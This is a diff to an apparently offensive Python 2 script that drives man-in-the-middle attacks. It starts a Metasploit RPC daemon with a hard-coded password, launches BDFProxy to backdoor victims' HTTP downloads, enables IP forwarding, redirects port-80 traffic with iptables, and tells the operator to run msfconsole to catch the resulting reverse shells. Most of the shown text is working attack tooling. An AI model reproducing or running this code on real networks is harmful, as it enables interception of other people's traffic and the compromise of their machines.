@@ -1,4 +1,7 @@
-import eznhlib, re, time, os, sys
+#!/usr/bin/python
+#coding=utf-8
+import eznhlib, re, time, os, sys, toolkits
+
 bash_cmd = eznhlib.bash_cmd
 get_gw = eznhlib.get_gw
 readUserInput = eznhlib.readUserInput
@@ -6,6 +9,10 @@ menu_parser = eznhlib.menu_parser
 popen_background = eznhlib.popen_background
 clean_iptables = eznhlib.clean_iptables
 userSelectGateway = eznhlib.userSelectGateway
+red = toolkits.red
+green = toolkits.green
+yellow = toolkits.yellow
+cyan = toolkits.cyan
 
 config_file = "mitmf.cfg"
 banner = """
@@ -261,18 +268,13 @@ def startMsfrpcd():
     bash_cmd("msfrpcd -U msf -P abc123 -a 127.0.0.1 -p 55552")
     return
 def startBDFProxy(gw, iface):
+    print red("DEBUG: in function startBDFProxy")
+    popen_background("python bdfproxy_config_template_generator.py")
     commands = """
-    pkill bdfproxy
-    pkill mitmproxy
-    pkill ruby
-    fuser -k 8080/tcp 80/tcp 443/tcp 8443/tcp 8081/tcp 81/tcp
-    sleep 2
     bdfproxy &
     echo 1 > /proc/sys/net/ipv4/ip_forward
     iptables -t nat -A PREROUTING -i {0} -p tcp --dport 80 -j REDIRECT --to-port 8080
-    # arpspoof -i {0} {1}
     msfdb start
-    msfconsole -r bdfproxy_msf_resource.rc
     """.format(
         str(iface),
         str(gw)
@@ -280,12 +282,16 @@ def startBDFProxy(gw, iface):
     bash_cmd(commands)
     return
 def startAttack(cmd, gw, iface):
+    print red("DEBUG: in function startAttack")
+
     # Checks if either browsersniper or filepwn/bdfproxyis enabled, which requires MSFRPCD to be started
     if re.search("browsersniper", cmd):
         startMsfrpcd()
     if re.search("filepwn", cmd):
         startMsfrpcd()
+    # cmd = cmd + " >> facerider.log | tail -f facerider.log"
     bash_cmd(cmd)
+    print red("DEBUG: Command Executed: %s" % str(cmd))
     startBDFProxy(gw, iface)
     main()
     return
@@ -293,15 +299,23 @@ def startAttack(cmd, gw, iface):
 def main():
     print """
     \r\n\t\t\t\t MAIN MENU
-    \r\n\t1:\tStart Attack with the configuration settings settings settings set
+    \r\n\t1:\tStart Attack with the configuration settings set
     \r\n\t2:\tStop the Attack
     """
+    print red("\nWarn: As of this version, BDFProxy will auto-start. All it requires is the INTERFACE = line to be set for it to acquire your loocal IPv4 address to set as LHOST for the shells")
+    print yellow("\nINFO: To catch the shells as this is running, run the command...")
+    print cyan("\n\t\tmsfconsole -r bdfproxy_msf_resource.rc")
     userInput = int(raw_input("Enter a option: "))
     if userInput == 1:
         readConfig(config_file)
     elif userInput == 2:
         # kills all responder services and parprouted IF RUNNing.
         cmd = "fuser -k 55552/tcp 55553/tcp 587/tcp 110/tcp 9999/tcp 143/tcp 80/tcp 10000/tcp 21/tcp 88/tcp 25/tcp 1433/tcp 445/tcp 3141/tcp 389/tcp;pkill parprouted"
+        bash_cmd(cmd)
+        cmd = """pkill bdfproxy
+pkill mitmproxy
+pkill ruby
+fuser -k 8080/tcp 80/tcp 443/tcp 8443/tcp 8081/tcp 81/tcp"""
         bash_cmd(cmd)
         clean_iptables()
         os.system('clear')
